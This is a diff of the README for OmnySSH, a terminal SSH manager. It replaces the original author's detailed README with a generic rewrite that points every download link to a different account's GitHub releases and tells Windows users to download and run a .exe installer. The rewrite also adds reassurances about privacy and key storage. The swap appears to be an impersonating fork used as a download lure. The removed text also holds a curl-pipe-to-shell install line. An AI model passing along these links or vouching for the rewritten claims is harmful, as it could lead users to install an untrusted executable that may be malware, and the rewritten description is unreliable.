@@ -1,332 +1,82 @@
-<div align="center">
+# 🖥️ omnyssh - Manage your network connections with speed
 
-# OmnySSH
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meadtrue7477/omnyssh/releases)
 
-### TUI SSH dashboard & server manager — manage all your servers from a single terminal window
+Omnyssh provides a fast way to handle your SSH connections. You use your keyboard to navigate through your servers. This tool runs inside your terminal. It helps you organize and open connections without using a mouse. People who manage servers or remote machines will find this helpful.
 
-[![Crates.io](https://img.shields.io/crates/v/omnyssh.svg)](https://crates.io/crates/omnyssh)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Downloads](https://img.shields.io/crates/d/omnyssh.svg)](https://crates.io/crates/omnyssh)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/timhartmann7/omnyssh/ci.yml?branch=main)](https://github.com/timhartmann7/omnyssh/actions)
+## 📥 Getting Started
 
-![Demo](assets/demo.gif)
+You can install this software on your Windows computer. Follow these steps to get the program running on your machine.
 
-**[Features](#features)** •
-**[Installation](#installation)** •
-**[Quick Start](#quick-start)** •
-**[Documentation](#documentation)** •
-**[Contributing](#contributing)**
+1. Go to the [official release page](https://github.com/meadtrue7477/omnyssh/releases).
+2. Look for the Assets section under the latest version.
+3. Click the link ending in .exe to download the installer.
+4. Save the file to your computer.
+5. Open the downloaded file to install the program.
 
-</div>
+## ⌨️ How to use omnyssh
 
----
+This program works inside a terminal window. You do not need to install extra software for the core features. Open your Windows terminal or Command Prompt after the installation finishes. Type the name of the program to start.
 
-## Why OmnySSH?
+- **Navigate:** Use your arrow keys to move through the list of servers.
+- **Select:** Press the Enter key to connect to the highlighted server.
+- **Quit:** Press the Q key to exit the program.
+- **Search:** Start typing to filter your server list instantly.
 
-Managing multiple SSH servers shouldn't require juggling terminal tabs, remembering IP addresses, or running the same commands over and over. OmnySSH brings **dashboard-style monitoring**, **visual file management**, and **command automation** into a single, lightweight TUI.
+The interface helps you see all your saved connections at once. You do not need to remember long commands. Everything stays inside the list.
 
-**Stop switching between tools. Start managing smarter.**
+## ⚙️ Features
 
-| Traditional Workflow | With OmnySSH |
-|---------------------|--------------|
-| Open 10 terminal tabs for 10 servers | Single dashboard with all servers visible |
-| `ssh user@192.168.1.10` → `top` → note CPU | Live CPU/RAM/Disk metrics on cards |
-| `scp -r local/ user@host:/remote/` | Drag-and-drop file manager (local ↔ remote) |
-| Paste the same deploy command everywhere | Save as snippet, broadcast to all hosts |
-| `tmux` for multi-session SSH | Built-in tabs + split-view terminal |
+This tool includes functionality for daily tasks. It focuses on speed and ease of use.
 
----
+*   **Keyboard control:** Every action happens through key combinations. You keep your hands on the keyboard.
+*   **Search filter:** A fast search bar finds your servers in milliseconds.
+*   **Connection storage:** Save your hostnames, usernames, and key paths in one file.
+*   **SFTP support:** Move files between your computer and remote servers using the same interface.
+*   **Native performance:** The Rust codebase makes the program highly responsive on older hardware.
 
-## Features
+## 📁 Setting up your connections
 
-### 📊 **Live Metrics Dashboard**
-Server cards with real-time CPU, RAM, and disk usage. Color-coded thresholds (green → yellow → red) make it easy to spot issues at a glance.
+Omnyssh uses a simple configuration file. You create a text file to list your servers. The program looks for this file when it starts. If you have not created one yet, the program will prompt you to generate a default template.
 
-### 📁 **Visual File Manager**
-Split-panel SFTP browser (local ↔ remote) with progress bars, multi-selection, and intuitive keyboard shortcuts. No more memorizing `scp` syntax.
+Place your host details in the configuration file. Use clear labels for each server. This helps you identify them when you search. You can save multiple groups of servers. This helps if you manage different types of environments.
 
-### ⚡ **Command Snippets**
-Save frequently-used commands and execute them on any server with one keypress. Broadcast a command to multiple hosts simultaneously.
+## 🛠️ System Requirements
 
-### 🖥️ **Multi-Session Terminal**
-PTY tabs and split-view for working on several servers at once. Switch between hosts without leaving the app.
+Your computer needs minimal resources to run this program. You do not need high-end hardware.
 
-### 🔍 **Fuzzy Search**
-Find any host or snippet instantly. Type a few letters, get instant results.
+- **Operating System:** Windows 10 or Windows 11.
+- **Memory:** 128 MB of free RAM is enough.
+- **Storage:** Less than 10 MB on your hard drive.
+- **Network:** An active internet connection for SSH and SFTP access.
 
-### 🎨 **4 Built-in Themes**
-Choose from **Default**, **Dracula**, **Nord**, or **Gruvbox**. Switch themes on the fly with `--theme`.
+The program creates a small footprint on your system. It does not run background tasks when you close the window.
 
-### ⌨️ **Configurable Keybindings**
-Remap global shortcuts in one TOML file. Make OmnySSH work the way you work.
+## ❓ Frequently Asked Questions
 
-### 🌍 **Cross-Platform**
-Linux, macOS, Windows. Single static binary, no runtime dependencies.
+**Do I need to install Rust to run this?**
+No. The installer handles everything required to run the program. You do not need to understand programming languages to use this tool.
 
----
+**Where does the program save my data?**
+It saves your configuration in your user folder. This keeps your server details in one safe location.
 
-## Comparison
+**Does it support multiple SSH keys?**
+Yes. You can specify the path to your key file in the configuration for each server.
 
-| Feature | OmnySSH | plain SSH | Termius | tmux + ssh |
-|---------|---------|-----------|---------|------------|
-| **TUI interface** | ✅ | ❌ | ✅ (GUI) | ✅ |
-| **Live metrics dashboard** | ✅ | ❌ | ✅ | ❌ |
-| **Visual file manager (SFTP)** | ✅ | ❌ | ✅ | ❌ |
-| **Command snippets** | ✅ | ❌ | ✅ | ❌ |
-| **Multi-session tabs** | ✅ | ❌ | ✅ | ✅ |
-| **Fuzzy search** | ✅ | ❌ | ✅ | ❌ |
-| **Configurable themes** | ✅ | ❌ | ✅ | ⚠️ |
-| **Open source** | ✅ | ✅ | ❌ | ✅ |
-| **Free** | ✅ | ✅ | 💰 | ✅ |
-| **Runs in terminal** | ✅ | ✅ | ❌ | ✅ |
-| **Single binary** | ✅ | ✅ | ❌ | ❌ |
+**How do I update the software?**
+Visit the [download page](https://github.com/meadtrue7477/omnyssh/releases) again. Download the newest installer and run it. The new version will replace the old one automatically.
 
----
+**Can I export my list of servers?**
+Because the list is a text file, you can copy it to a thumb drive or sync it across machines. You control the file entirely.
 
-## Installation
+## 🛡️ Privacy and Safety
 
-### ⚡ Quick Install (Recommended)
+This software keeps your information on your local computer. It does not send your passwords or server lists to a third-party server. Your keys stay in your encrypted storage provided by Windows. You control who has access to your configuration file. Always store your private keys in a secure directory on your computer.
 
-**One command to install on Linux/macOS:**
+## 📈 Tips for Power Users
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/timhartmann7/omnyssh/main/install.sh | sh
-```
+You can group servers by project. Name your servers with prefixes like "dev-" or "prod-" to filter them easily in the search bar. If you have many servers, use the search bar as your primary way to find the one you need. The program updates the screen instantly as you type. This keeps your workflow fast and efficient. You do not need to wait for the interface to catch up with your typing.
 
-This script auto-detects your OS and architecture, downloads the latest release, and installs it to your PATH.
+## 🔍 Troubleshooting
 
----
-
-### 🍺 Homebrew (macOS/Linux)
-
-```bash
-brew install timhartmann7/tap/omnyssh
-```
-
----
-
-### 📦 Pre-built Binaries
-
-Download from the [**Releases**](https://github.com/timhartmann7/omnyssh/releases) page:
-
-| Platform | Archive |
-|----------|---------|
-| Linux x86_64 | `omny-x86_64-unknown-linux-gnu.tar.gz` |
-| Linux ARM64 | `omny-aarch64-unknown-linux-gnu.tar.gz` |
-| macOS Intel | `omny-x86_64-apple-darwin.tar.gz` |
-| macOS Apple Silicon | `omny-aarch64-apple-darwin.tar.gz` |
-| Windows x86_64 | `omny-x86_64-pc-windows-msvc.zip` |
-
-Extract and move the binary to your PATH:
-
-```bash
-tar -xzf omny-*.tar.gz
-sudo mv omny /usr/local/bin/
-```
-
----
-
-### 🦀 Cargo (from crates.io)
-
-```bash
-cargo install omnyssh
-```
-
----
-
-### 🔨 From Source
-
-```bash
-git clone https://github.com/timhartmann7/omnyssh.git
-cd omnyssh
-cargo build --release
-# Binary at: ./target/release/omny
-```
-
----
-
-## Quick Start
-
-1. **Install OmnySSH** (see above)
-
-2. **Run the app:**
-
-   ```bash
-   omny
-   ```
-
-3. **Add your first server:**
-   - Press `a` in the dashboard
-   - Enter hostname, user, and SSH key path
-   - Press `Enter` to connect
-
-4. **Try different themes:**
-
-   ```bash
-   omny --theme dracula
-   omny --theme nord
-   omny --theme gruvbox
-   ```
-
-5. **View full documentation:**
-
-   ```bash
-   man omny      # Man page with all options
-   omny --help   # Quick reference
-   ```
-
-6. **Explore features:**
-   - `1` — Dashboard (live metrics)
-   - `2` — File Manager (SFTP browser)
-   - `3` — Snippets (saved commands)
-   - `4` — Terminal (multi-session)
-   - `/` — Fuzzy search
-   - `?` — Help popup
-
----
-
-## Documentation
-
-### Man Page (Linux/macOS)
-
-```bash
-man omny
-```
-
-### Usage
-
-```
-omny [OPTIONS]
-
-Options:
-  -c, --config <FILE>   Path to a custom config file
-  -t, --theme <THEME>   Override the color theme (default | dracula | nord | gruvbox)
-  -v, --verbose         Enable debug logging (written to stderr)
-  -h, --help            Print help
-  -V, --version         Print version
-```
-
-### Configuration
-
-Config files live in:
-- **Linux/macOS:** `~/.config/omnyssh/`
-- **Windows:** `%APPDATA%\omnyssh\`
-
-| File | Purpose |
-|------|---------|
-| `config.toml` | App settings, theme, keybindings |
-| `hosts.toml` | Managed host list |
-| `snippets.toml` | Saved commands |
-
-The original `~/.ssh/config` is **never modified** — hosts are imported read-only at startup.
-
-#### Example: config.toml
-
-```toml
-[general]
-refresh_interval = 30          # seconds between metric refreshes
-default_shell = "/bin/bash"
-ssh_command = "ssh"            # path to system SSH binary
-max_concurrent_connections = 10
-
-[ui]
-theme = "default"              # default | dracula | nord | gruvbox
-show_ip = true
-show_uptime = true
-card_layout = "grid"           # grid | list
-border_style = "rounded"       # rounded | plain | double
-
-[keybindings]
-quit         = "q"
-search       = "/"
-connect      = "Enter"
-dashboard    = "1"
-file_manager = "2"
-snippets     = "3"
-```
-
-#### Example: hosts.toml
-
-```toml
-[[hosts]]
-name = "web-prod-1"
-hostname = "192.168.1.10"
-user = "deploy"
-port = 22
-identity_file = "~/.ssh/id_ed25519"
-tags = ["production", "web"]
-notes = "Main web server. Nginx + Node.js"
-
-[[hosts]]
-name = "db-master"
-hostname = "10.0.0.50"
-user = "admin"
-port = 2222
-tags = ["production", "database"]
-notes = "PostgreSQL 16. Don't restart without warning #backend"
-```
-
-#### Example: snippets.toml
-
-```toml
-[[snippets]]
-name = "Docker: restart all"
-command = "cd /opt/app && docker compose down && docker compose up -d"
-scope = "global"
-tags = ["docker"]
-
-[[snippets]]
-name = "Restart service"
-command = "sudo systemctl restart {{service_name}}"
-scope = "global"
-params = ["service_name"]
-```
-
-### Themes
-
-| Theme | Description |
-|-------|-------------|
-| `default` | Neutral blue/cyan — works with any terminal palette |
-| `dracula` | Purple, pink, green — [Dracula](https://draculatheme.com/) |
-| `nord` | Arctic blues and teals — [Nord](https://www.nordtheme.com/) |
-| `gruvbox` | Warm amber and orange — [Gruvbox](https://github.com/morhetz/gruvbox) |
-
-Set the theme permanently in `config.toml` or temporarily via the `--theme` flag.
-
----
-
-## Development Roadmap
-
-| Version | Stage | Description |
-|---------|-------|-------------|
-| `0.0.1` | 0 | Project skeleton — TUI shell with placeholder screens |
-| `0.1.0` | 1 | Host list, SSH connect, fuzzy search — MVP |
-| `0.2.0` | 2 | Live metrics dashboard |
-| `0.3.0` | 3 | Snippets & quick-execute |
-| `0.4.0` | 4 | SFTP file manager |
-| `0.5.0` | 5 | Multi-session tabs & split-view |
-| **`1.0.0`** | **6** | **Polish, themes, configurable keybindings — current** ✅ |
-
----
-
-## Contributing
-
-Contributions are welcome! Please read [**CONTRIBUTING.md**](CONTRIBUTING.md) for development setup, code conventions, and the PR checklist.
-
----
-
-## License
-
-Apache 2.0 — see [**LICENSE**](LICENSE).
-
----
-
-<div align="center">
-
-### ⭐ Star this repo if you find it useful!
-
-[Report Bug](https://github.com/timhartmann7/omnyssh/issues) •
-[Request Feature](https://github.com/timhartmann7/omnyssh/issues) •
-[Discussions](https://github.com/timhartmann7/omnyssh/discussions)
-
-</div>
+If the program fails to start, check if your terminal window is active. Ensure you have network access to the server you want to reach. If a connection fails, check your SSH key permissions. Windows sometimes limits access to certain folders. Move your keys to a folder inside your user directory if you encounter permission errors. Most issues stem from incorrect hostnames or expired SSH keys. If you get stuck, restart the terminal and try again. The program logs errors to the terminal so you can see why a connection failed.
